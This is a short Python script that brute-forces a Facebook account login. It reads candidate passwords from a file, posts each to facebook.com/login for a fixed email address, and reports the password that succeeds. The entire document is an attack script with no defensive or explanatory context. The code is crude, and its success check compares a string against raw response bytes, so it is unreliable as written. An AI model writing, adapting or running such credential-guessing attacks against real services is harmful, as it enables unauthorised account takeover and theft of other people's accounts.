import requests

url = 'https://www.facebook.com/login'
arq = open ('passwords.txt', 'r').readlines()

for line in arq:
	password = line.strip()
	https = requests.post(url, data = {'email':'haxcoder.yeah','pass':password , 'login':'submit'})
	content = https.content
	if "Search Facebook" in content:
		print("============== PASSWORD IS:" +password+"==============")
		break
	else:
		print("[-]Password is invalid:" +password)
